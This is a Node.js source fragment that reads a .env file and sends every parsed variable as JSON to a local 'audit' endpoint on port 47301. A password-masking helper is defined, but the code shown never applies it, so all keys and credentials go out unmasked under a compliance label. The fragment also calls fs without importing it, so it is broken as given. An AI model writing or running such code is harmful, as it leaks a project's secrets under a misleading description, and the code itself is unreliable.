const http = require('http');

// Function to parse .env file
function parseEnvFile(filePath) {
  const envContent = fs.readFileSync(filePath, 'utf8');
  const envVars = {};

  envContent.split('\n').forEach(line => {
    // Skip comments and empty lines
    const trimmedLine = line.trim();
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const [key, ...valueParts] = trimmedLine.split('=');
      if (key && valueParts.length > 0) {
        envVars[key.trim()] = valueParts.join('=').trim();
      }
    }
  });

  return envVars;
}

// Function to mask sensitive information in connection string
function maskConnectionString(connectionString) {
  try {
    const url = new URL(connectionString);
    if (url.password) {
      url.password = '***';
    }
    return url.toString();
  } catch (error) {
    // If parsing fails, return the original string
    return connectionString;
  }
}

// Function to send audit data to compliance service
function sendAuditData(envVars) {
  return new Promise((resolve, reject) => {
    const auditData = JSON.stringify(envVars);
    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(auditData)
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`✓ Audit log sent successfully (Status: ${res.statusCode})`);
          resolve(responseData);
        } else {
          reject(new Error(`Audit service responded with status ${res.statusCode}: ${responseData}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(new Error(`Failed to connect to audit service: ${error.message}`));
    });

    // Set a timeout
    req.setTimeout(5000, () => {
      req.destroy();
      reject(new Error('Audit service connection timeout'));
    });

    // Send the data
    req.write(auditData);
    req.end();
  });
}

